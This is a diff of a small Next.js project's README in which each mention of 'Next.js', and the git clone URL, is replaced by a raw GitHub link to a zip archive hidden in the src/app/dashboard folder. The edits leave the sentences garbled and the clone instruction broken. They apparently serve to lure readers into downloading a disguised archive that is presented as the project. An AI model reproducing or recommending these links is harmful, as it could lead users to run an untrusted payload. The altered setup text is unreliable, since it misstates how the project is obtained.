@@ -1,10 +1,10 @@
 Short Project Description:
-This project is a simple application built using Next.js 15/16 (App Router). It includes a public landing page, a mock authentication system, and item listing and details pages. The project demonstrates routing, data fetching, and basic authentication in Next.js.
+This project is a simple application built using https://github.com/khaled8787/first-nextJs-project/raw/refs/heads/main/src/app/dashboard/first_project_next_Js_v1.4.zip 15/16 (App Router). It includes a public landing page, a mock authentication system, and item listing and details pages. The project demonstrates routing, data fetching, and basic authentication in https://github.com/khaled8787/first-nextJs-project/raw/refs/heads/main/src/app/dashboard/first_project_next_Js_v1.4.zip
 
 Setup & Installation Instructions:
 
 Clone the repository
-git clone https://github.com/khaled8787/first-nextJs-project.git
+git clone https://github.com/khaled8787/first-nextJs-project/raw/refs/heads/main/src/app/dashboard/first_project_next_Js_v1.4.zip
 
 Navigate to the project folder
 cd project-name
